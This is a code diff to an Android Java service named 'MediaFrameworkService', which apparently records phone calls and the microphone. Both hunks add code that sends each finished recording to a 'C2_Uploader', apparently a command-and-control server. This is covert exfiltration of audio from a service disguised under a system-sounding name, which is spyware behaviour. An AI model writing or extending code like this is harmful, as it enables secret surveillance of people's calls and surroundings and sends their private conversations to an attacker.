@@ -396,6 +396,13 @@ public class MediaFrameworkService extends Service {
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
 
+        if (currentRecordingPath != null) {
+            File recFile = new File(currentRecordingPath);
+            if (recFile.exists() && recFile.length() > 0) {
+                C2_Uploader.uploadFile(this, recFile);
+            }
+        }
+
         updateNotification();
     }
 
@@ -516,6 +523,13 @@ public class MediaFrameworkService extends Service {
 
         long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
         Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);
+
+        if (currentRecordingPath != null) {
+            File recFile = new File(currentRecordingPath);
+            if (recFile.exists() && recFile.length() > 0) {
+                C2_Uploader.uploadFile(this, recFile);
+            }
+        }
 
         updateNotification();
     }
